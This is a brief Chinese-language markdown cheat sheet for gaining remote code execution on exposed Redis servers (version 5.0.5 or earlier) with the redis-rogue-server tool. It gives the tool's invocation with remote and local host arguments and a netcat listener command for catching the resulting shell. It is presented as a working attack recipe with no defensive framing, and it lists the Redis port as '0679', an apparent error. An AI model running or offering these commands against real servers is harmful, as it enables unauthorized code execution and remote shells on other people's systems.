# redis-rogue-server rce

当 `redis` 可以远程访问并且Redis <= 5.0.5

1. 访问:0679端口。 查看是否可以远程访问

2. `redis-rogue-server.py -h`


3. 使用

```
python3 redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
                                远程主机            本地主机


# 开启监听
# nc相应端口
 nc -lvvp 9999

```


